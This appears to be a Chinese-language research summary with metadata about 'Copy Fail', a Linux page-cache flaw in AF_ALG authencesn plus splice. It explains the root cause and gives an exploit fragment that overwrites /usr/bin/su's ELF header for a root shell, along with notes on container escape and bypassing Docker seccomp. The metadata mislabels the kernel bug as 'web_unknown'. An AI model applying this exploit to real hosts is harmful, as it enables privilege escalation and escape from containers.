---
title: Copy Fail 深度研究：Linux 页缓存漏洞的根因、利用与检测
contest: 安全研究文章
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [kernel, page-cache, AF_ALG, splice, CVE, container-escape, authencesn, esn]
attack_chain:
  - 漏洞点：AF_ALG + splice in-place处理导致page cache被改
  - authencesn: AAD[4:8]临时写入scratch供HMAC
  - sendmsg发8字节AAD 4字节X填+4字节待写数据
  - splice从/usr/bin/su送t+4字节到AF_ALG socket
  - 多次调用覆盖ELF头部获得root shell
  - 同namespace容器共享镜像层page cache
  - Docker默认seccomp不阻止
key_payload: op.sendmsg([aad],cmsg,MSG_MORE); os.splice(target_fd,pipe_w,t+4,offset_src=0); os.splice(pipe_r,op.fileno(),t+4)
one_liner: Linux page cache写穿漏洞：AF_ALG+splice in-place污染只读文件
lesson: 容器共享page cache导致只读volume可写；AF_ALG sendmsg/splice是攻击面
quality: high
---

# Copy Fail 深度研究：Linux 页缓存漏洞的根因、利用与检测

## 题目信息
- 文章：ctfiot 转载
- 主题：Linux 内核 Page Cache 漏洞
- 关联 CVE：类似 CVE-2022-0185 / CVE-2022-0995 思路
- 攻击效果：覆盖 /usr/bin/su ELF 头获得 root shell

## 关键攻击链
1. **背景组件**：
   - AF_ALG socket（AF=38, SOL_ALG=279）
   - algif_aead / authencesn
   - scatterlist (SGL) + scatterwalk
   - IPsec ESP 序列号
2. **in-place 漏洞（2017 之后）**：
   - `memcpy_sglist(rsgl, tsgl_src, outlen)` 复制 AAD+密文到 RX buffer
   - `af_alg_pull_tsgl` 取出 tag pages
   - `sg_chain(rsgl_sg, rsgl_nents, areq->tsgl)` 链到 RX SGL 尾部
   - `aead_request_set_crypt(rsgl_src, rsgl_dst, ...)` src/dst 同 SGL
3. **ESN 序列号写入**：
   - AAD[0:4] SPI, AAD[4:8] SeqNo_Hi
   - HMAC 前把 AAD[4:8] 临时写入 dst 中 tag 区域
   - HMAC 完成还原
4. **完整 Exploit**：
   ```python
   aad = b'\x00\x00\x00\x00' + evil_bytes  # 8字节
   op.sendmsg([aad], cmsg, MSG_MORE)
   pipe_r, pipe_w = os.pipe()
   target_fd = os.open("/usr/bin/su", os.O_RDONLY)
   os.splice(target_fd, pipe_w, t+4, offset_src=0)
   os.splice(pipe_r, op.fileno(), t+4)
   ```
5. **容器逃逸**：不同 namespace 容器共享 page cache → 写穿只读 volume

## 关键技术点
- 内核 AF_ALG 子系统
- authencesn ESN（Extended Sequence Number）
- SGL scatterlist 操作
- splice page reference 传递
- Docker seccomp bypass

## 评分
- quality: high（深度内核分析，从根因到利用到检测完整）
